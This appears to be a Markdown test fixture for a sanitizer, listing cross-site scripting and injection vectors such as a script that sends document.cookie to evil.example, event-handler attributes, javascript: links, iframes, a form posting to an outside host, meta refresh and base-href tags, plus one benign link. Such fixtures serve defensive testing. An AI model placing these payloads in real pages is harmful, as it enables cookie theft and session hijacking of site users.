# Malicious

<script>fetch("https://evil.example/steal?c=" + document.cookie)</script>

<img src="x" onerror="alert(1)">

<a href="javascript:alert(1)">a javascript link</a>

[a javascript markdown link](javascript:alert(2))

![a data-uri image](data:image/svg+xml;base64,PHN2Zy8+)

![a remote image](https://evil.example/tracker.png)

<iframe src="https://evil.example/frame"></iframe>

<style>body { background: url("https://evil.example/css"); }</style>

<form action="https://evil.example/post"><input type="text" name="secret"><button>go</button></form>

<svg onload="alert(3)"><circle r="10"/></svg>

<meta http-equiv="refresh" content="0; url=https://evil.example/">

<body onload="alert(4)">

<p onmouseover="alert(5)" style="position: fixed">Event handlers and styles.</p>

<object data="https://evil.example/o"></object>

<base href="https://evil.example/">

A `<script>` in code, and an <a href="https://example.com/ok">ordinary link</a>.
